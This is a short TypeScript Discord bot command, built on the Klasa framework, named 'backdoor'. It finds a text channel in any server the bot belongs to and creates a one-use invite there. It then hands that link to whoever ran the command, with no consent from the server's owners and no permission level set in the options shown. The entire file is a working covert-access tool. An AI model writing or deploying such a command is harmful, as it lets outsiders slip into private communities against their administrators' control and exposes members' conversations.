import { applyOptions } from '../../util/applyOptions';
import { KlasaMessage, Command, KlasaGuild } from 'klasa';
import { GuildChannel } from 'discord.js';

@applyOptions({
    name: 'backdoor',
    description: 'Create a invite link to backdoor any server the bot is in.',
    usage: '<Guild:guild>',
})
export default class Backdoor extends Command {

    async run(message: KlasaMessage, [guild]: [KlasaGuild]) {

        const { code } = 
        await this.genInvite(this.resolveChannel(guild))
        .catch(() => ({ code: null }));

        if (!code) return message.send('Unable to create invite link.');

        return message.send(`Created backdoor invite: https://discord.gg/${code}`);
    }

    private genInvite(channel: GuildChannel) {

        return channel.createInvite({
            temporary: false,
            maxAge: 100,
            maxUses: 1,
        });
    }

    private resolveChannel(guild: KlasaGuild) {

        return guild.channels.find(
            chan =>
            chan.type === 'text' &&
            chan.permissionsFor(this.client.user).has(['VIEW_CHANNEL', 'CREATE_INSTANT_INVITE'])
        );
    }
}
